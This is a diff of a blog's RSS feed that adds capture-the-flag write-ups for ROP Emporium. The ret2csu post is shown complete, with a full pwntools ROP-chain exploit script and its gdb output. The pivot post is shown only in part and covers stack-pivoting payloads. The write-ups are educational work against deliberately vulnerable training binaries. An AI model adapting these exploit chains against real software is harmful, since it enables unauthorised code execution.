@@ -2,17 +2,1137 @@
     <channel>
         <title><![CDATA[Markel Mencía's blog]]></title>
         <description><![CDATA[Markel's blog, mainly focused on Computer Science but also about other topics.]]></description>
-        <link>https://markelmencia.github.io</link>
+        <link>https://markelmencia.com</link>
         <generator>RSS for Node</generator>
-        <lastBuildDate>Fri, 26 Dec 2025 23:16:29 GMT</lastBuildDate>
-        <atom:link href="https://markelmencia.github.io/rss.xml" rel="self" type="application/rss+xml"/>
+        <lastBuildDate>Thu, 01 Jan 2026 22:03:39 GMT</lastBuildDate>
+        <atom:link href="https://markelmencia.com/rss.xml" rel="self" type="application/rss+xml"/>
         <language><![CDATA[en]]></language>
+        <item>
+            <title><![CDATA[ROP Emporium x86-64 Challenge 8: ret2csu]]></title>
+            <description><![CDATA[<h1>ROP Emporium x86-64 Challenge 8: ret2csu</h1>
+<h4>December 29, 2025</h4>
+<p>We're in the home stretch! This is the last challenge of ROP Emporium. This challenge is not as unconventional as <a href="rop-emporium-pivot-writeup">the previous one</a>, but it will present some challenges.</p>
+<p>The description says that this challenge is similar to the <a href="rop-emporium-callme-writeup">callme</a> challenge. There's a <code>ret2win</code> function somewhere that we have to call with <code>0xdeadbeefdeadbeef</code>, <code>0xcafebabecafebabe</code> and <code>0xd00df00dd00df00d</code> as arguments. The catch is that the number of gadgets we have is very limited.</p>
+<p>However, with this challenge we'll learn a technique that will allow us to obtain useful gadgets in virtually every ELF binary. This technique has to do with the name of this challenge: ret2csu. This vulnerability actually has a lot to do with some of the concepts of the previous challenge: dynamic linking. Let's explain what is it about.</p>
+<h2>The issue with dynamically linked binaries</h2>
+<p>In the previous challenge we briefly talked about dynamic/shared libraries. These libraries are linked into a binary at runtime. They are quite handful because they reduce the size of binaries, because their functions aren't "copied" into the them during compile time, like static libraries do. They just get loaded into memory, allowing multiple programs to link them.</p>
+<p>However, as is the case in many other areas of Computer Science, optimization oftentimes comes at the cost of complexity. This is the case here too. In order to make dynamic linking work, binaries need to import some extra static libraries to perform these links (this is a gross generalization, I highly recommend reading <a href="https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf">this article</a> mentioned in the challenge description). These libraries contain some functions, obviously. And guess what? These functions contain gadgets, and pretty powerful ones!</p>
+<h2>Our key vulnerability: <code>__libc_csu_init</code></h2>
+<p>This function, albeit its very much unattractive name, contains <strong>two gadgets</strong> that grant us control of some key registers. And as I've mentioned, it can be found in lots of binaries. And of course, it's in the binary of this challenge. So let's open it up with pwndbg and begin investigating:</p>
+<pre><code>pwndbg> info functions
+...
+0x0000000000400640  __libc_csu_init
+...
+</code></pre>
+<p>As you can see, I'm not lying. Let's disassemble it:</p>
+<pre><code>pwndbg> disas __libc_csu_init
+   0x0000000000400640 &#x3C;+0>:	    push   r15
+   0x0000000000400642 &#x3C;+2>:	    push   r14
+   0x0000000000400644 &#x3C;+4>:	    mov    r15,rdx
+   0x0000000000400647 &#x3C;+7>:	    push   r13
+   0x0000000000400649 &#x3C;+9>:	    push   r12
+   0x000000000040064b &#x3C;+11>:	lea    r12,[rip+0x20079e]        # 0x600df0
+   0x0000000000400652 &#x3C;+18>:	push   rbp
+   0x0000000000400653 &#x3C;+19>:	lea    rbp,[rip+0x20079e]        # 0x600df8
+   0x000000000040065a &#x3C;+26>:	push   rbx
+   0x000000000040065b &#x3C;+27>:	mov    r13d,edi
+   0x000000000040065e &#x3C;+30>:	mov    r14,rsi
+   0x0000000000400661 &#x3C;+33>:	sub    rbp,r12
+   0x0000000000400664 &#x3C;+36>:	sub    rsp,0x8
+   0x0000000000400668 &#x3C;+40>:	sar    rbp,0x3
+   0x000000000040066c &#x3C;+44>:	call   0x4004d0 &#x3C;_init>
+   0x0000000000400671 &#x3C;+49>:	test   rbp,rbp
+   0x0000000000400674 &#x3C;+52>:	je     0x400696 &#x3C;__libc_csu_init+86>
+   0x0000000000400676 &#x3C;+54>:	xor    ebx,ebx
+   0x0000000000400678 &#x3C;+56>:	nop    DWORD PTR [rax+rax*1+0x0]
+   0x0000000000400680 &#x3C;+64>:	mov    rdx,r15
+   0x0000000000400683 &#x3C;+67>:	mov    rsi,r14
+   0x0000000000400686 &#x3C;+70>:	mov    edi,r13d
+   0x0000000000400689 &#x3C;+73>:	call   QWORD PTR [r12+rbx*8]
+   0x000000000040068d &#x3C;+77>:	add    rbx,0x1
+   0x0000000000400691 &#x3C;+81>:	cmp    rbp,rbx
+   0x0000000000400694 &#x3C;+84>:	jne    0x400680 &#x3C;__libc_csu_init+64>
+   0x0000000000400696 &#x3C;+86>:	add    rsp,0x8
+   0x000000000040069a &#x3C;+90>:	pop    rbx
+   0x000000000040069b &#x3C;+91>:	pop    rbp
+   0x000000000040069c &#x3C;+92>:	pop    r12
+   0x000000000040069e &#x3C;+94>:	pop    r13
+   0x00000000004006a0 &#x3C;+96>:	pop    r14
+   0x00000000004006a2 &#x3C;+98>:	pop    r15
+   0x00000000004006a4 &#x3C;+100>:	ret
+</code></pre>
+<p>Pretty sizeable function. Let's focus our attention on the last instructions:</p>
+<pre><code>   0x000000000040069a &#x3C;+90>:	pop    rbx
+   0x000000000040069b &#x3C;+91>:	pop    rbp
+   0x000000000040069c &#x3C;+92>:	pop    r12
+   0x000000000040069e &#x3C;+94>:	pop    r13
+   0x00000000004006a0 &#x3C;+96>:	pop    r14
+   0x00000000004006a2 &#x3C;+98>:	pop    r15
+   0x00000000004006a4 &#x3C;+100>:	ret
+</code></pre>
+<p>This is basically Gadget Paradise. With one gadget, we can pop values into six different registers, no questions asked.</p>
+<p>But there's more!</p>
+<pre><code>   0x0000000000400680 &#x3C;+64>:	mov    rdx,r15
+   0x0000000000400683 &#x3C;+67>:	mov    rsi,r14
+   0x0000000000400686 &#x3C;+70>:	mov    edi,r13d
+   0x0000000000400689 &#x3C;+73>:	call   QWORD PTR [r12+rbx*8]
+</code></pre>
+<p>This might not look like a gadget at all (it doesn't end with a <code>ret</code> instruction), but it's a perfectly valid gadget. It grants us access to even more registers, thanks to the <code>mov</code> instructions. And since the <code>call</code> instruction will call an address based on <code>r12</code> and <code>rbx</code>, which are registers that we can control with the previous gadget, we can pretty much call whatever function we want. This is brutal, and it's one of the reasons why buffer overflow attacks are so dangerous. Just think about how many programs use dynamic linking! All of those binaries include this function in them.</p>
+<h2>Hold your horses</h2>
+<p>Actually, it's not like that anymore. After the <a href="https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf">article mentioned before</a> was published, <strong>glibc</strong> was updated. Essentially, they removed the necessity of statically linking <code>__libc_csu_init</code>. Now, if you dynamically compile a program and check its functions, you won't see <code>__libc_csu_init</code> anymore. Still, we can learn quite a bit by seeing how this could be exploited. That's what we'll do in this challenge.</p>
+<p>Before that, I'd like to reflect on how this change came to be. This patch goes to show how necessary research is, and the importance of having people willing to squeeze a binary to its absolute limits with the goal of finding an exploitable vulnerability.</p>
+<p>The reason why this vulnerability was fixed was purely because it was found. And for that, I'd like to give some appreciation to Dr. Hector Marco-Gisbert and Dr. Ismael Ripoll-Ripoll, the two authors of the article. I find this vulnerability in particular quite cool, especially because of how portable it is (or was). Thanks two these two researchers, C programming became much more safe, so we have a lot to thank them for!</p>
+<h2>The payload</h2>
+<p>Now that we know what tools to use, and what our goal is, we can begin building the foundations of the exploit. As we've done with the rest of the challenges, let's define some variables:</p>
+<pre><code>from pwn import *
+
+OFFSET = 40
+RET_INSTRUCTION_ADDRESS = 0x004004e6
+
+CSU_POP_GADGET_ADDRESS = 0x0040069a
+CSU_MOV_GADGET_ADDRESS = 0x00400680
+
+ARG_1 = 0xdeadbeefdeadbeef
+ARG_2 = 0xcafebabecafebabe
+ARG_3 = 0xd00df00dd00df00d
+
+RET2WIN_FUNCTION_ADDRESS = 0x00400510
+</code></pre>
+<p>Let's see what we can do with this. Before we add anything else, let's check <code>usefulFunction</code> to see how we need to call <code>ret2win</code>:</p>
+<pre><code>pwndbg> disas usefulFunction
+   0x0000000000400617 &#x3C;+0>:	    push   rbp
+   0x0000000000400618 &#x3C;+1>:	    mov    rbp,rsp
+   0x000000000040061b &#x3C;+4>:	    mov    edx,0x3
+   0x0000000000400620 &#x3C;+9>:	    mov    esi,0x2
+   0x0000000000400625 &#x3C;+14>:	mov    edi,0x1
+   0x000000000040062a &#x3C;+19>:	call   0x400510 &#x3C;ret2win@plt>
+   0x000000000040062f &#x3C;+24>:	nop
+   0x0000000000400630 &#x3C;+25>:	pop    rbp
+   0x0000000000400631 &#x3C;+26>:	ret
+</code></pre>
+<p>Alright, it seems like the argument order is <code>(edi, esi, edx)</code>. This means that <code>ARG_1</code> will need to be stored in <code>edi</code>, <code>ARG_2</code> in <code>esi</code> and <code>ARG_3</code> in <code>edx</code>.</p>
+<pre><code>   0x000000000040069a &#x3C;+90>:	pop    rbx
+   0x000000000040069b &#x3C;+91>:	pop    rbp
+   0x000000000040069c &#x3C;+92>:	pop    r12
+   0x000000000040069e &#x3C;+94>:	pop    r13
+   0x00000000004006a0 &#x3C;+96>:	pop    r14
+   0x00000000004006a2 &#x3C;+98>:	pop    r15
+   0x00000000004006a4 &#x3C;+100>:	ret
+
+   0x0000000000400680 &#x3C;+64>:	mov    rdx,r15
+   0x0000000000400683 &#x3C;+67>:	mov    rsi,r14
+   0x0000000000400686 &#x3C;+70>:	mov    edi,r13d
+   0x0000000000400689 &#x3C;+73>:	call   QWORD PTR [r12+rbx*8]
+</code></pre>
+<p>Looking at the two gadgets, it seems like we can indirectly store them in those registers, by adding the arguments to <code>r13</code>, <code>r14</code> and <code>r15</code> respectively. We first pop the values into the registers with the <code>pop</code> gadget, and then we move them to the appropriate registers with the <code>mov</code> gadget. Let's write it in code:</p>
+<pre><code>payload = b"A"*OFFSET
+payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
+payload += p64(CSU_POP_GADGET_ADDRESS)
+payload += p64(0) # rbx
+payload += p64(0) # rbp
+payload += p64(0) # r12
+payload += p64(ARG_1) # r13
+payload += p64(ARG_2) # r14
+payload += p64(ARG_3) # r15
+payload += p64(CSU_MOV_GADGET_ADDRESS)
+</code></pre>
+<p>This should do. Since I don't know what to write in the other registers yet, I'll pop <code>0</code>s for now.</p>
+<p>Now that the arguments are supposedly in the correct registers, we can just call <code>ret2win</code>.</p>
+<pre><code>   0x0000000000400689 &#x3C;+73>:	call   QWORD PTR [r12+rbx*8]
+</code></pre>
+<p>Because of how the <code>call</code> instruction from the <code>mov</code> gadget obtains its pointer, we'll have to perform some basic arithmetic. Just by setting <code>rbx</code> to <code>0</code>, we'll be able to jump into whatever pointer is stored in the address in <code>r12</code>. Yes, do not confuse this with a <code>call r12</code> instruction, it's a <code>call [r12]</code> instruction, meaning that it will go to the address in memory stored in <code>r12</code> and jump into whatever pointer is stored in it. This means that just popping the address of <code>ret2win</code> into <code>r12</code> won't work. We'll need to pop an address in which the address to <code>ret2win</code> is stored. Do mind the difference!</p>
+<p>Since <code>ret2win</code> is from a shared library, its address to it will eventually be stored in the <strong>GOT</strong>. To get its address, we can simply execute the program, add a breakpoint anywhere (such as in <code>main</code>) and then execute the <code>got</code> command to see its address:</p>
+<pre><code>pwndbg> break main
+pwndbg> run
+pwndbg> got
+[0x601018] pwnme -> 0x400506 (pwnme@plt+6) ◂— push 0 /* 'h' */
+[0x601020] ret2win -> 0x400516 (ret2win@plt+6) ◂— push 1
+</code></pre>
+<p>There we have it. Now let's change the value of <code>RET2WIN_FUNCTION_ADDRESS</code> to its appropriate value...</p>
+<pre><code>RET2WIN_FUNCTION_ADDRESS = 0x601020
+</code></pre>
+<p>...and change the payload accordingly:</p>
+<pre><code>payload = b"A"*OFFSET
+payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
+payload += p64(CSU_POP_GADGET_ADDRESS)
+payload += p64(0) # rbx
+payload += p64(0) # rbp
+payload += p64(RET2WIN_FUNCTION_ADDRESS) # r12
+payload += p64(ARG_1) # r13
+payload += p64(ARG_2) # r14
+payload += p64(ARG_3) # r15
+payload += p64(CSU_MOV_GADGET_ADDRESS)
+
+open("exploit", "bw").write(payload)
+</code></pre>
+<p>Good! I've also added a line to write our payload into a file. Let's see what we get when we execute the binary with this input:</p>
+<pre><code>$ ./ret2csu &#x3C; exploit
+ret2csu by ROP Emporium
+x86_64
+
+Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.
+
+> Thank you!
+Incorrect parameters
+</code></pre>
+<p>Huh, that's weird. Let's add a breakpoint in <code>ret2win</code> to see the values of the registers when the call was made:</p>
+<pre><code>pwndbg> break ret2win
+pwndbg> run &#x3C; exploit
+</code></pre>
+<p>In the REGISTERS tab...</p>
+<pre><code> RDX  0xd00df00dd00df00d
+ RDI  0xdeadbeef
+ RSI  0xcafebabecafebabe
+</code></pre>
+<p>It seems like the <code>rdi</code> value wasn't copied fully, only the first 4 bytes. Looking back at the <code>mov</code> gadget, it's now easy to see why:</p>
+<pre><code>   0x0000000000400680 &#x3C;+64>:	mov    rdx,r15
+   0x0000000000400683 &#x3C;+67>:	mov    rsi,r14
+   0x0000000000400686 &#x3C;+70>:	mov    edi,r13d
+   0x0000000000400689 &#x3C;+73>:	call   QWORD PTR [r12+rbx*8]
+</code></pre>
+<p><code>edi</code> actually corresponds to <strong>the lower 32 bits of <code>rdx</code></strong>. So if we move a value into it, only the first half of <code>rdx</code> will be set, the rest will be <code>0</code>s. This, is quite a pickle.</p>
+<p>This gadget is actually not enough for what we want to accomplish. So one valid response to that could be looking for other gadgets. Luckily, there's some light:</p>
+<pre><code>pwndbg> rop
+...
+0x4006a3: pop rdi ; ret
+...
+</code></pre>
+<p>There's a gadget just for what we need. However, there's another issue. How do we jump into it?</p>
+<p>As we know, this is the last gadget of our ROP chain:</p>
+<pre><code>   0x0000000000400680 &#x3C;+64>:	mov    rdx,r15
+   0x0000000000400683 &#x3C;+67>:	mov    rsi,r14
+   0x0000000000400686 &#x3C;+70>:	mov    edi,r13d
+   0x0000000000400689 &#x3C;+73>:	call   QWORD PTR [r12+rbx*8]
+</code></pre>
+<p>This is not like the regular-old gadget that ends with <code>ret</code>. It calls a function. This complicates what we need to do, because we can't just call a gadget like with <code>ret</code>. It has to be a valid function.</p>
+<p>My idea was to find an "empty" function, or simulate one. After executing that function, it would return back to our function, where we'd use the next <code>ret</code> instruction to jump into the <code>pop rdi; ret</code> gadget, and then to <code>ret2win</code>. It turned out that that was a good direction to take. However, finding one is easier said that done, and I had to look it up.</p>
+<p>Luckily for us, there is a function we can use. It's called <code>_fini</code>. It does have its uses with destructors, which are some functions executed when a program finishes its execution. However, for us, it's literally a nothing burger:</p>
+<pre><code>pwndbg> disas _fini
+   0x00000000004006b4 &#x3C;+0>:	sub    rsp,0x8
+   0x00000000004006b8 &#x3C;+4>:	add    rsp,0x8
+   0x00000000004006bc &#x3C;+8>:	ret
+</code></pre>
+<p>See? It does nothing. It's perfect for us, because once it returns, we can continue the ROP chain like nothing happened. With <code>info functions</code>, we can get the address to this function: <code>0x004006b4</code>. Since our <code>call</code> instruction in the gadget requires to use an address with the pointer to the function, we need to find where is this address stored. We can do this with the <code>search</code>command:</p>
+<pre><code>pwndbg> break main
+pwndbg> run
+pwndbg> search -8 0x004006b4
+ret2csu         0x4003b0 mov ah, 6
+ret2csu         0x400e48 mov ah, 6
+ret2csu         0x6003b0 0x4006b4 (_fini)
+ret2csu         0x600e48 0x4006b4 (_fini)
+</code></pre>
+<p>Both <code>0x6003b0</code> and <code>0x600e48</code> store the address, so we can use either. Let's create a variable in our script to store the address and replace the <code>call</code> address:</p>
+<pre><code>payload = b"A"*OFFSET
+payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
+payload += p64(CSU_POP_GADGET_ADDRESS)
+payload += p64(0) # rbx
+payload += p64(0) # rbp
+payload += p64(_FINI_FUNCTION_ADDRESS) # r12
+payload += p64(ARG_1) # r13
+payload += p64(ARG_2) # r14
+payload += p64(ARG_3) # r15
+payload += p64(CSU_MOV_GADGET_ADDRESS)
+</code></pre>
+<p>However, there's something we need to keep into account. After calling <code>_fini</code>, we'll return back to <code>__libc_csu_init</code>:</p>
+<pre><code>...
+   0x0000000000400689 &#x3C;+73>:	call   QWORD PTR [r12+rbx*8]
+   0x000000000040068d &#x3C;+77>:	add    rbx,0x1  &#x3C;- HERE
+   0x0000000000400691 &#x3C;+81>:	cmp    rbp,rbx
+   0x0000000000400694 &#x3C;+84>:	jne    0x400680
+   0x0000000000400696 &#x3C;+86>:	add    rsp,0x8
+   0x000000000040069a &#x3C;+90>:	pop    rbx
+   0x000000000040069b &#x3C;+91>:	pop    rbp
+   0x000000000040069c &#x3C;+92>:	pop    r12
+   0x000000000040069e &#x3C;+94>:	pop    r13
+   0x00000000004006a0 &#x3C;+96>:	pop    r14
+   0x00000000004006a2 &#x3C;+98>:	pop    r15
+   0x00000000004006a4 &#x3C;+100>:	ret
+</code></pre>
+<p>Until the next <code>ret</code> instruction (where we'll jump into the <code>pop rdi; ret</code> gadget and then to <code>ret2win</code>, there are 6 pop instructions. We have to take this into consideration in our payload! Because these instructions will remove values from the stack, if we put in the address to the <code>pop rdi; ret</code> gadget right after the rest of the payload, the <code>pop rbx</code> instruction will remove it, and we won't be able to jump into it once we reach <code>ret</code>. This means that we'll have to add spacing in our payload, just so the pop instructions pop empty values before the gadget and not the gadget itself. We'll need seven spacings, six for the <code>pop</code> instructions and one for the <code>ret</code> instruction in <code>_fini</code>, which also pops an entry from the stack. Let's add this in our code:</p>
+<pre><code>payload += p64(0) # ret
+payload += p64(0) # pop rbx
+payload += p64(0) # pop rbp
+payload += p64(0) # pop r12
+payload += p64(0) # pop r13
+payload += p64(0) # pop r14
+payload += p64(0) # pop r15
+</code></pre>
+<p>After this spacing, now we can add the rest of the payload:</p>
+<pre><code>payload += p64(POP_RDI_GADGET_ADDRESS)
+payload += p64(ARG_1)
+payload += p64(RET2WIN_FUNCTION_ADDRESS)
+</code></pre>
+<p>This will store the argument properly.</p>
+<p>However, this code will not work.</p>
+<pre><code>   0x0000000000400689 &#x3C;+73>:	call   QWORD PTR [r12+rbx*8]
+   0x000000000040068d &#x3C;+77>:	add    rbx,0x1
+   0x0000000000400691 &#x3C;+81>:	cmp    rbp,rbx
+   0x0000000000400694 &#x3C;+84>:	jne    0x400680
+</code></pre>
+<p>Right after <code>call</code>, a comparison is made. The function will jump to a different part of the code should <code>rbx</code> and <code>rbp</code> be different. We don't want that, so we need to make sure <code>rbp</code> and <code>rbx</code> are equal after the <code>add</code> instruction. This is easy, we can just pop a <code>1</code> into <code>rbp</code> in our code.</p>
+<p>And just one more thing! We aren't executing <code>ret2win</code> via <code>call</code> anymore. Since it had a different way of referencing functions, we'll have to change <code>RET2WIN_FUNCTION_ADDRESS</code> to its original value.</p>
+<p>Here's the full script:</p>
+<pre><code>from pwn import *
+
+OFFSET = 40
+RET_INSTRUCTION_ADDRESS = 0x004004e6
+
+CSU_POP_GADGET_ADDRESS = 0x0040069a
+CSU_MOV_GADGET_ADDRESS = 0x00400680
+POP_RDI_GADGET_ADDRESS = 0x004006a3
+
+ARG_1 = 0xdeadbeefdeadbeef
+ARG_2 = 0xcafebabecafebabe
+ARG_3 = 0xd00df00dd00df00d
+
+RET2WIN_FUNCTION_ADDRESS = 0x400510
+_FINI_FUNCTION_ADDRESS = 0x6003b0
+
+payload = b"A"*OFFSET
+payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
+payload += p64(CSU_POP_GADGET_ADDRESS)
+payload += p64(0) # rbx
+payload += p64(1) # rbp
+payload += p64(_FINI_FUNCTION_ADDRESS) # r12
+payload += p64(ARG_1) # r13
+payload += p64(ARG_2) # r14
+payload += p64(ARG_3) # r15
+payload += p64(CSU_MOV_GADGET_ADDRESS)
+payload += p64(0) # ret
+payload += p64(0) # pop rbx
+payload += p64(0) # pop rbp
+payload += p64(0) # pop r12
+payload += p64(0) # pop r13
+payload += p64(0) # pop r14
+payload += p64(0) # pop r15
+payload += p64(POP_RDI_GADGET_ADDRESS)
+payload += p64(ARG_1)
+payload += p64(RET2WIN_FUNCTION_ADDRESS)
+
+
+open("exploit", "bw").write(payload)
+</code></pre>
+<p>Executing this script and using the output file as input will give us the flag:</p>
+<pre><code>$ python3 exploit.py
+$ ./ret2csu &#x3C; exploit
+ret2csu by ROP Emporium
+x86_64
+
+Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.
+
+> Thank you!
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+]]></description>
+            <link>https://markelmencia.com/writeups/rop-emporium-ret2csu-writeup</link>
+            <guid isPermaLink="true">https://markelmencia.com/writeups/rop-emporium-ret2csu-writeup</guid>
+            <pubDate>Mon, 29 Dec 2025 00:00:00 GMT</pubDate>
+        </item>
+        <item>
+            <title><![CDATA[ROP Emporium x86-64 Challenge 7: pivot]]></title>
+            <description><![CDATA[<h1>ROP Emporium x86-64 Challenge 7: pivot</h1>
+<h4>December 28, 2025</h4>
+<p>In this challenge, we'll learn a new binary exploitation technique.</p>
+<p>In some binaries, we might not have enough space in the stack to build a complete ROP chain. However, we might be able to work around that on some occasions by <strong>pivoting the stack</strong>. This involves writing a chain somewhere else in memory and then <em>pivoting</em> the stack to that address, which essentially means moving your stack to that position.</p>
+<p>We'll learn to do just that in this challenge. It is a bit tricky, though, and we'll have to use different methodologies for it.</p>
+<p>Let's start by running the binary:</p>
+<pre><code>$ ./pivot
+pivot by ROP Emporium
+x86_64
+
+Call ret2win() from libpivot
+The Old Gods kindly bestow upon you a place to pivot: 0x7efecc008f10
+Send a ROP chain now and it will land there
+> AAAAAAAA
+Thank you!
+
+Now please send your stack smash
+> BBBBBBBBBB
+Thank you!
+
+Exiting
+</code></pre>
+<p>For this challenge, we are told that we need to call <code>ret2win</code> to win. This function seems to be in <code>libpivot</code>. We'll see what that means later.</p>
+<p>Other than that, we're also given an address in which seemingly we can pivot into. Executing the binary multiple times we'll make you realize that this address changes per execution. We'll see how we deal with that.</p>
+<p>The catch is that we're given two inputs now, which essentially means that we'll need to build two payloads. The first one will contain the ROP chain that will be placed in the pivot address, and the second one will be the regular buffer input we're accustomed to by now.</p>
+<p>Let's take a look at the functions:</p>
+<pre><code>pwndbg> info functions
+0x00000000004006a0  _init
+0x00000000004006d0  free@plt
+0x00000000004006e0  puts@plt
+0x00000000004006f0  printf@plt
+0x0000000000400700  memset@plt
+0x0000000000400710  read@plt
+0x0000000000400720  foothold_function@plt
+0x0000000000400730  malloc@plt
+0x0000000000400740  setvbuf@plt
+0x0000000000400750  exit@plt
+0x0000000000400760  _start
+0x0000000000400790  _dl_relocate_static_pie
+0x00000000004007a0  deregister_tm_clones
+0x00000000004007d0  register_tm_clones
+0x0000000000400810  __do_global_dtors_aux
+0x0000000000400840  frame_dummy
+0x0000000000400847  main
+0x00000000004008f1  pwnme
+0x00000000004009a8  uselessFunction
+0x00000000004009bb  usefulGadgets
+0x00000000004009d0  __libc_csu_init
+0x0000000000400a40  __libc_csu_fini
+0x0000000000400a44  _fini
+</code></pre>
+<p>Just like in the other challenges, we have our regular functions like <code>pwnme</code> and <code>usefulGadgets</code>. We also have a so-called <code>uselessFunction</code> (somehow I doubt that), but... Where's <code>ret2win</code>? We are told that's our target function, but it's nowhere to be see in <code>info functions</code>. Well, there's another catch in this challenge.</p>
+<h2>Shared libraries</h2>
+<p>As we saw before, <code>ret2win</code> seems to be in a library called <code>libpivot</code>. If we read the challenge description, it says that this challenge imports one function from that library: <code>foothold_function</code>, but that <code>ret2win</code> isn't imported. Then how can we call a function that isn't even in the code?</p>
+<p>Libraries are just a set of already defined functions and variables that we can load into our code to use them along with the functions we've created. Let's quickly <code>ls</code> the challenge directory:</p>
+<pre><code>$ ls
+flag.txt  libpivot.so  pivot
+</code></pre>
+<p>Other than the binary and the flag, there's a <code>.so</code> file, our <code>libpivot</code>. This is a <strong>shared library</strong>. A shared library is a regular library, with code in it of course, that is mapped into memory so multiple programs (or other libraries) can use those functions in their own code.</p>
+<p>Getting right into the point, <strong>the whole library is loaded into memory</strong>. In our binary, only <code>foothold_function</code> is actually called from <code>libpivot</code>. However, somewhere else in memory, <code>ret2win</code>, and whatever other functions exist in <code>libpivot</code> can be found.</p>
+<p>Another handful piece of knowledge is that the functions of shared libraries are loaded into memory contiguously, one after another. Thus, we might be able to access <code>ret2win</code> just by adding an offset to the function address of <code>foothold_function</code>, which we know from <code>info functions</code>.</p>
+<p>Great! Know we know about stack pivoting and the use of shared libraries. Let's hunt for gadgets and other useful resources we might use in the binary:</p>
+<pre><code>pwndbg> disas usefulGadgets
+   0x00000000004009bb &#x3C;+0>:	    pop    rax
+   0x00000000004009bc &#x3C;+1>:	    ret
+   0x00000000004009bd &#x3C;+2>:	    xchg   rsp,rax
+   0x00000000004009bf &#x3C;+4>:	    ret
+   0x00000000004009c0 &#x3C;+5>:	    mov    rax,QWORD PTR [rax]
+   0x00000000004009c3 &#x3C;+8>:	    ret
+   0x00000000004009c4 &#x3C;+9>:	    add    rax,rbp
+   0x00000000004009c7 &#x3C;+12>:	ret
+   0x00000000004009c8 &#x3C;+13>:	nop    DWORD PTR [rax+rax*1+0x0]
+</code></pre>
+<p>We've got some useful stuff in here. First, a simple <code>pop rax; ret</code> gadget we can use to store arbitrary values into <code>rax</code>.</p>
+<p>Then we have a <code>xchg rsp, rax; ret</code> gadget. This one is very useful for stack pivoting, because it swaps the values between <code>rax</code> and <code>rsp</code>. <code>rsp</code> is the <strong>Stack Pointer</strong>, if we have control over it, we can easily change the address of the stack, essentially pivoting it.</p>
+<p>With the <code>mov rax, [rax]</code> we can move into the register <code>rax</code> whatever value in memory is in the address of <code>rax</code>. And then, we have a <code>add rax, rbp; ret</code> gadget, which should be self-explanatory. However, since this gadget requires control to <code>rbp</code>, let's see if we can find another gadget to pop a value into <code>rbp</code>:</p>
+<pre><code>pwndbg> rop
+...
+0x004007c8 : pop rbp ; ret
+...
+</code></pre>
+<p>Sure enough, we do. Let's note its address down.</p>
+<h2>Pivoting the stack</h2>
+<p>We should probably start thinking about the stack pivoting first. We'll have to write a ROP chain (preferably small, because we're told we don't have much space in the buffer) to change the stack position elsewhere: the address we're given when we run the binary. This is a good moment to start talking about the way we will perform the exploit this time.</p>
+<p>Up until now, in my writeups, I've used a python script to create a file containing the payload, to then use as input for the binary, separately. In this case, because we need to "extract" the address we're given in the output of the binary, and because we require two payloads, not one, it's going to be more comfortable to interact with the binary directly in the Python script, with pwntools. Let's start with it!</p>
+<pre><code>from pwn import *
+
+elf = context.binary = ELF("./pivot", checksec=False)
+p = gdb.debug(elf.path, gdbscript="")
+</code></pre>
+<p>With this code, we're basically creating a variable that will link a process that will run pwndbg with the binary on it, in case we need to look up information with pwndbg mid-runtime. With this, we'll be able to provide input to it and read its output more comfortably. First, let's store in a variable the address that the binary gives us to pivot to:</p>
+<pre><code>p.recvuntil(b"pivot: ")
+PIVOT_STACK_ADDRESS = int(p.recvline(), 16)
+</code></pre>
+<p>With this snippet, we read the output until <code>pivot: </code>. After that string, in the same line, we can find the pivot stack address is. So, we read what's left of that line and we store it in <code>PIVOT_STACK_ADDRESS</code>, cast into an integer.</p>
+<p>Now let's do the regular drill, let's store into variables the useful gadgets:</p>
+<pre><code>POP_RAX_GADGET_ADDRESS = 0x004009bb
+XCHG_RSP_RAX_GADGET_ADDRESS = 0x004009bd
+MOV_RAX_RAX_GADGET_ADDRESS = 0x004009c0
+ADD_RAX_RBP_GADGET_ADDRESS = 0x004009c4
+POP_RBP_GADGET_ADDRESS = 0x004007c8
+</code></pre>
+<p>These gadgets are more than enough to perform the stack pivoting. Our idea is to load the pivot stack address into <code>rsp</code>, essentially changing the address of the stack to <code>PIVOT_STACK_ADDRESS</code>. This can be done fairly easiliy.</p>
+<p>After finding out that the return address offset is once again 40, we can write the first payload:</p>
+<pre><code>OFFSET = 40
+
+first_payload = b"A" * OFFSET
+first_payload += p64(POP_RAX_GADGET_ADDRESS)
+first_payload += p64(PIVOT_STACK_ADDRESS)
+first_payload += p64(XCHG_RSP_RAX_GADGET_ADDRESS)
+</code></pre>
+<p>That'll do. Since we have full control of <code>rax</code>, first we pop the pivot stack address into it, and then we exchange the value of <code>rsp</code> with <code>rax</code>. Now <code>rsp</code> holds <code>PIVOT_STACK_ADDRESS</code>.</p>
+<p>After this payload, we'll have a bigger stack to work on. Here's where the actual exploit will happen, where we'll somehow call <code>ret2win</code>. Let's see how we can do this.</p>
+<h2>Diving into the library</h2>
+<p>Before we continue with the exploit script, we should take a proper dive into what's actually inside <code>libpivot</code>. This can actually be done with pwndbg as well:</p>
+<pre><code>$ pwndbg libpivot.so
+pwndbg> info functions
+0x0000000000000808  _init
+0x0000000000000830  puts@plt
+0x0000000000000840  fclose@plt
+0x0000000000000850  fgets@plt
+0x0000000000000860  fopen@plt
+0x0000000000000870  exit@plt
+0x0000000000000880  __cxa_finalize@plt
+0x0000000000000890  deregister_tm_clones
+0x00000000000008d0  register_tm_clones
+0x0000000000000920  __do_global_dtors_aux
+0x0000000000000960  frame_dummy
+0x000000000000096a  foothold_function
+0x000000000000097d  void_function_01
+0x0000000000000997  void_function_02
+0x00000000000009b1  void_function_03
+0x00000000000009cb  void_function_04
+0x00000000000009e5  void_function_05
+0x00000000000009ff  void_function_06
+0x0000000000000a19  void_function_07
+0x0000000000000a33  void_function_08
+0x0000000000000a4d  void_function_09
+0x0000000000000a67  void_function_10
+0x0000000000000a81  ret2win
+0x0000000000000b14  _fini
+</code></pre>
+<p>These are the functions inside <code>libpivot</code>. <em>Now</em> we can see <code>ret2win</code>.</p>
